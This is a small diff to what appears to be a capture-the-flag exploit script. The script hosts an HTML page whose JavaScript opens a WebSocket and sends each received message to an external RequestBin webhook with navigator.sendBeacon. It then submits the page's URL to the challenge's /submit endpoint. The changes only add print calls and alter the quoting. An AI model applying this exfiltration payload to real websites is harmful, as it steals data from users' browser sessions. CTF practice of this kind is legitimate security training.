@@ -9,6 +9,7 @@ from WebUtils.HTTPWebhook import RequestBinWebHook
 WebUtils.setBaseURL('http://chall.polygl0ts.ch:9010/')
 
 with RequestBinWebHook("enbit6i3l2ra4") as hook:
+    print(hook.url)
     src_html = """
     <body>
     <script>
@@ -18,7 +19,7 @@ with RequestBinWebHook("enbit6i3l2ra4") as hook:
         };
         ws.onmessage = (d) => {
             console.log(d);
-            navigator.sendBeacon('""" + hook.url + """', d.data);
+            navigator.sendBeacon(`""" + hook.url + """`, d.data);
         }
     </script>
     </body>
@@ -26,6 +27,7 @@ with RequestBinWebHook("enbit6i3l2ra4") as hook:
 
     # host payload
     url = http_host(src_html)
+    print(url)
 
     res = post("/submit", data={
         'url': url
